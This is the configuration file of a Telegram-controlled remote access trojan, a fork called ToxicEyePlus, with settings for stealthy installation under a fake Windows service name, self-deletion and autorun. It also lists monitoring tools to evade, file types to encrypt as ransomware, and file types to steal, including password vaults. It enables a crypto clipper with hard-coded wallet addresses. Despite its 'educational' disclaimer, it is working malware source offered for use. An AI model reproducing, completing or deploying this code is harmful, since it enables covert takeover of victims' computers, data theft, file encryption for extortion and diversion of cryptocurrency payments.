/* 
       ^ Author    : LimerBoy, Modified by MiskaDev
       ^ Name      : ToxicEye-RAT, ToxicEyePlus
       ^ Github    : https:github.com/LimerBoy, github.com/MiskaWasTaken/ToxicEyePlus

       > This program is distributed for educational purposes only. Not intended or permitted for malicious use
        
       > This fork has made ToxicEye a bit more stealthy with some minor changes and a slightly more verbose output on login and shutdown

       > Any file that has "modified by MiskaDev" means this file was modified and is not the original, any file without it means that it hasnt been changede
*/


namespace TelegramRAT
{
    internal sealed class config
    {
        // Telegram settings.
        public const string TelegramToken = "UR_TELEGRAM_TOKEN_HERE";
        public const string TelegramChatID = "TELEGRAM_CHAT_ID_HERE";
        public static int TelegramCommandCheckDelay = 1;
        // Installation to system.
        public static bool AdminRightsRequired = true;
        public static bool AttributeHiddenEnabled = true;
        public static bool AttributeSystemEnabled = true;
        public static bool MeltFileAfterStart = true;
        public static string InstallPath = @"C:\Users\Static\NTUSER.exe";
        // Add to startup.
        public static bool AutorunEnabled = true;
        public static string AutorunName = "System Event Notification Service Host";
        // Protect process with BSoD (if killed). Recommended to keep false to prevent bsod on start
        public static bool ProcessBSODProtectionEnabled = false;
        // Hide console window. Need for debugging.
        public static bool HideConsoleWindow = true;
        // Do not start trojan if it running in VirtualBox, VMWare, SandBoxie, Debuggers.
        public static bool PreventStartOnVirtualMachine = false;
        // Start delay (in seconds).
        public static int StartDelay = 0;
        // The program will not make requests to telegram api if processes are running below.
        public static bool BlockNetworkActivityWhenProcessStarted = true;
        // Process list
        public static string[] BlockNetworkActivityProcessList =
        {
            "taskmgr", "processhacker",
            "netstat", "netmon", "tcpview", "wireshark",
            "filemon", "regmon", "cain", "fiddler", "http debugger"
        };
        // Types of files to be encrypted
        public static string[] EncryptionFileTypes =
        {
            ".lnk", 
            ".png", ".jpg", ".bmp", ".psd",
            ".pdf", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
            ".csv", ".sql", ".mdb", ".sln", ".php", "py", ".asp", ".aspx", ".html", ".xml"
        };
        // Maximum file size to grab (in bytes). Recommended to keep this to 9 unless you arent using images, then you can set it to 40 (first digit)
        public static long GrabFileSize = 9291456;
        // What types of files will be downloaded from the computer when executing the /GrabDesktop command.
        public static string[] GrabFileTypes =
        {
            ".kdbx",
            ".png", ".jpg", ".bmp",
            ".pdf", ".txt", ".rtf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
            ".sql", ".php", ".py", ".html", ".xml", ".json", ".csv"
        };
        // Automatically steal all passwords and send to chat at first start. (didnt work for me cba to fix lol)
        public static bool AutoStealerEnabled = false;
        // Clipper is enabled
        public static bool ClipperEnabled = true;
        // Your wallet addresses
        public static string bitcoin_address = "1DJ5VetDBuQnmDZjRHRgEiCwYwvc6PSwu8";
        public static string etherium_address = "0x357C0541F19a7755AFbF1CCD824EE06059404238";
        public static string monero_address = "42Pwy6Xe4mPTz3mLap7AB5Jjd9NBt1MWjiqyvEFx3Fn8Fo9cRw9aJUHE1iTXEpUbQacMNiSxYejBKFE7UdGnyEncEECJey9";
    }
}
